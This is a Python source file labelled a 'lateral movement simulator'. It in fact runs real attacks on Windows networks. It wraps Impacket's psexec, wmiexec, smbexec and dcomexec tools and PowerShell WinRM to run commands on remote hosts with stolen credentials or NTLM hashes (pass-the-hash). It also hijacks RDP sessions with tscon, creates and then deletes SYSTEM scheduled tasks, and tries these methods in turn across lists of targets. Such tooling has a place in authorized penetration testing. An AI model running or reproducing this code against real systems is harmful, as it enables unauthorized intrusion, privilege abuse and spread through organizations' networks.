#!/usr/bin/env python3
import subprocess
import os
import json
import time
from datetime import datetime
from collections import defaultdict

class LateralMovement:
    def __init__(self):
        self.output_dir = f"lateral_movement_{int(datetime.now().timestamp())}"
        self.results = defaultdict(list)
        
    def psexec_attack(self, target, username, password, domain=None, command='cmd.exe'):
        print(f"\033[93m[*] Attempting PSExec to {target}...\033[0m")
        
        domain_str = f"{domain}/" if domain else ""
        
        cmd = [
            'psexec.py',
            f'{domain_str}{username}:{password}@{target}',
            command
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 or 'C:\\' in result.stdout:
                print(f"\033[92m[+] PSExec successful!\033[0m")
                
                self.results['psexec'].append({
                    'target': target,
                    'username': username,
                    'success': True,
                    'output': result.stdout[:500]
                })
                
                return True
            else:
                print(f"\033[91m[!] PSExec failed\033[0m")
                return False
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
    
    def wmiexec_attack(self, target, username, password, domain=None, command='whoami'):
        print(f"\033[93m[*] Attempting WMI execution on {target}...\033[0m")
        
        domain_str = f"{domain}/" if domain else ""
        
        cmd = [
            'wmiexec.py',
            f'{domain_str}{username}:{password}@{target}',
            command
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 or result.stdout.strip():
                print(f"\033[92m[+] WMI execution successful!\033[0m")
                print(f"\033[97m  Output: {result.stdout[:200]}\033[0m")
                
                self.results['wmiexec'].append({
                    'target': target,
                    'username': username,
                    'command': command,
                    'output': result.stdout
                })
                
                return True
            else:
                print(f"\033[91m[!] WMI execution failed\033[0m")
                return False
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
    
    def smbexec_attack(self, target, username, password, domain=None, command='ipconfig'):
        print(f"\033[93m[*] Attempting SMBExec on {target}...\033[0m")
        
        domain_str = f"{domain}/" if domain else ""
        
        cmd = [
            'smbexec.py',
            f'{domain_str}{username}:{password}@{target}',
            command
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 or result.stdout.strip():
                print(f"\033[92m[+] SMBExec successful!\033[0m")
                
                self.results['smbexec'].append({
                    'target': target,
                    'username': username,
                    'command': command,
                    'output': result.stdout[:500]
                })
                
                return True
            else:
                print(f"\033[91m[!] SMBExec failed\033[0m")
                return False
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
    
    def pass_the_hash(self, target, username, nthash, domain=None):
        print(f"\033[93m[*] Attempting Pass-the-Hash to {target}...\033[0m")
        
        domain_str = f"{domain}/" if domain else ""
        
        cmd = [
            'psexec.py',
            '-hashes', f':{nthash}',
            f'{domain_str}{username}@{target}',
            'cmd.exe'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 or 'C:\\' in result.stdout:
                print(f"\033[92m[+] Pass-the-Hash successful!\033[0m")
                
                self.results['pass_the_hash'].append({
                    'target': target,
                    'username': username,
                    'hash': nthash[:20] + '...',
                    'success': True
                })
                
                return True
            else:
                print(f"\033[91m[!] Pass-the-Hash failed\033[0m")
                return False
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
    
    def rdp_hijacking(self, target, username, password, session_id='2'):
        print(f"\033[93m[*] Attempting RDP session hijacking...\033[0m")
        
        commands = [
            f'query user',
            f'tscon {session_id} /dest:console'
        ]
        
        for command in commands:
            print(f"\033[97m  Executing: {command}\033[0m")
            
            success = self.wmiexec_attack(target, username, password, command=command)
            
            if not success:
                print(f"\033[91m[!] RDP hijacking failed\033[0m")
                return False
        
        print(f"\033[92m[+] RDP session hijacking attempted\033[0m")
        
        self.results['rdp_hijacking'].append({
            'target': target,
            'session_id': session_id
        })
        
        return True
    
    def winrm_attack(self, target, username, password, domain=None, command='hostname'):
        print(f"\033[93m[*] Attempting WinRM execution on {target}...\033[0m")
        
        if domain:
            user_str = f"{domain}\\{username}"
        else:
            user_str = username
        
        ps_command = f"Invoke-Command -ComputerName {target} -Credential (New-Object System.Management.Automation.PSCredential('{user_str}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ {command} }}"
        
        cmd = ['powershell', '-Command', ps_command]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 or result.stdout.strip():
                print(f"\033[92m[+] WinRM execution successful!\033[0m")
                print(f"\033[97m  Output: {result.stdout[:200]}\033[0m")
                
                self.results['winrm'].append({
                    'target': target,
                    'username': username,
                    'command': command,
                    'output': result.stdout
                })
                
                return True
            else:
                print(f"\033[91m[!] WinRM execution failed\033[0m")
                return False
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
    
    def dcom_attack(self, target, username, password, domain=None):
        print(f"\033[93m[*] Attempting DCOM execution on {target}...\033[0m")
        
        domain_str = f"{domain}/" if domain else ""
        
        cmd = [
            'dcomexec.py',
            f'{domain_str}{username}:{password}@{target}',
            'cmd.exe /c whoami'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 or result.stdout.strip():
                print(f"\033[92m[+] DCOM execution successful!\033[0m")
                
                self.results['dcom'].append({
                    'target': target,
                    'username': username,
                    'output': result.stdout[:500]
                })
                
                return True
            else:
                print(f"\033[91m[!] DCOM execution failed\033[0m")
                return False
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
    
    def scheduled_task_attack(self, target, username, password, domain=None, task_name='UpdateTask'):
        print(f"\033[93m[*] Creating scheduled task on {target}...\033[0m")
        
        commands = [
            f'schtasks /create /tn "{task_name}" /tr "cmd.exe /c whoami > C:\\temp\\output.txt" /sc once /st 23:59 /ru SYSTEM /f',
            f'schtasks /run /tn "{task_name}"',
            f'timeout /t 5',
            f'type C:\\temp\\output.txt',
            f'schtasks /delete /tn "{task_name}" /f'
        ]
        
        for command in commands:
            print(f"\033[97m  Executing: {command[:60]}...\033[0m")
            
            success = self.wmiexec_attack(target, username, password, domain=domain, command=command)
            
            time.sleep(2)
        
        print(f"\033[92m[+] Scheduled task execution attempted\033[0m")
        
        self.results['scheduled_task'].append({
            'target': target,
            'task_name': task_name
        })
        
        return True
    
    def automated_lateral_movement(self, targets, username, password, domain=None):
        print(f"\033[93m[*] Automated lateral movement across {len(targets)} targets...\033[0m")
        
        successful = []
        
        for target in targets:
            print(f"\n\033[97m[*] Target: {target}\033[0m")
            
            methods = [
                ('PSExec', lambda: self.psexec_attack(target, username, password, domain)),
                ('WMI', lambda: self.wmiexec_attack(target, username, password, domain)),
                ('SMB', lambda: self.smbexec_attack(target, username, password, domain))
            ]
            
            for method_name, method_func in methods:
                print(f"\n\033[97m  Trying {method_name}...\033[0m")
                
                if method_func():
                    successful.append({'target': target, 'method': method_name})
                    break
                
                time.sleep(2)
        
        print(f"\n\033[92m[+] Lateral movement complete: {len(successful)}/{len(targets)} successful\033[0m")
        
        return successful
    
    def enumerate_sessions(self, target, username, password, domain=None):
        print(f"\033[93m[*] Enumerating sessions on {target}...\033[0m")
        
        commands = [
            'query user',
            'qwinsta',
            'net session'
        ]
        
        sessions_info = []
        
        for command in commands:
            result = self.wmiexec_attack(target, username, password, domain=domain, command=command)
            
            if result:
                sessions_info.append(command)
        
        return sessions_info
    
    def generate_report(self):
        os.makedirs(self.output_dir, exist_ok=True)
        
        report_file = os.path.join(self.output_dir, 'lateral_movement_report.json')
        
        total_attacks = sum(len(attacks) for attacks in self.results.values())
        
        report = {
            'session_date': datetime.now().isoformat(),
            'output_directory': self.output_dir,
            'total_attacks': total_attacks,
            'techniques_used': list(self.results.keys()),
            'results': dict(self.results)
        }
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n\033[92m[+] Report saved: {report_file}\033[0m")

def run():
    print("\033[92m" + "="*70)
    print("     LATERAL MOVEMENT SIMULATOR")
    print("="*70 + "\033[0m\n")
    
    lateral = LateralMovement()
    
    print("\033[97mLateral Movement Techniques:\033[0m")
    print("\033[97m  [1] PSExec\033[0m")
    print("\033[97m  [2] WMI Execution\033[0m")
    print("\033[97m  [3] SMBExec\033[0m")
    print("\033[97m  [4] Pass-the-Hash\033[0m")
    print("\033[97m  [5] WinRM\033[0m")
    print("\033[97m  [6] DCOM Execution\033[0m")
    print("\033[97m  [7] Scheduled Task\033[0m")
    print("\033[97m  [8] Automated lateral movement\033[0m")
    
    choice = input(f"\n\033[95m[?] Select option: \033[0m").strip()
    
    if choice in ['1', '2', '3', '5', '6', '7']:
        target = input("\033[95m[?] Target host: \033[0m").strip()
        username = input("\033[95m[?] Username: \033[0m").strip()
        password = input("\033[95m[?] Password: \033[0m").strip()
        domain = input("\033[95m[?] Domain (optional): \033[0m").strip() or None
        
        if choice == '1':
            lateral.psexec_attack(target, username, password, domain)
        
        elif choice == '2':
            command = input("\033[95m[?] Command to execute: \033[0m").strip()
            lateral.wmiexec_attack(target, username, password, domain, command)
        
        elif choice == '3':
            command = input("\033[95m[?] Command to execute: \033[0m").strip()
            lateral.smbexec_attack(target, username, password, domain, command)
        
        elif choice == '5':
            command = input("\033[95m[?] Command to execute: \033[0m").strip()
            lateral.winrm_attack(target, username, password, domain, command)
        
        elif choice == '6':
            lateral.dcom_attack(target, username, password, domain)
        
        elif choice == '7':
            task_name = input("\033[95m[?] Task name: \033[0m").strip()
            lateral.scheduled_task_attack(target, username, password, domain, task_name)
        
        lateral.generate_report()
    
    elif choice == '4':
        target = input("\033[95m[?] Target host: \033[0m").strip()
        username = input("\033[95m[?] Username: \033[0m").strip()
        nthash = input("\033[95m[?] NTLM hash: \033[0m").strip()
        domain = input("\033[95m[?] Domain (optional): \033[0m").strip() or None
        
        lateral.pass_the_hash(target, username, nthash, domain)
        lateral.generate_report()
    
    elif choice == '8':
        targets = []
        
        print("\n\033[97m[*] Enter targets (empty to finish):\033[0m")
        
        while True:
            target = input("\033[95m[?] Target host: \033[0m").strip()
            
            if not target:
                break
            
            targets.append(target)
        
        if targets:
            username = input("\033[95m[?] Username: \033[0m").strip()
            password = input("\033[95m[?] Password: \033[0m").strip()
            domain = input("\033[95m[?] Domain (optional): \033[0m").strip() or None
            
            lateral.automated_lateral_movement(targets, username, password, domain)
            lateral.generate_report()
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
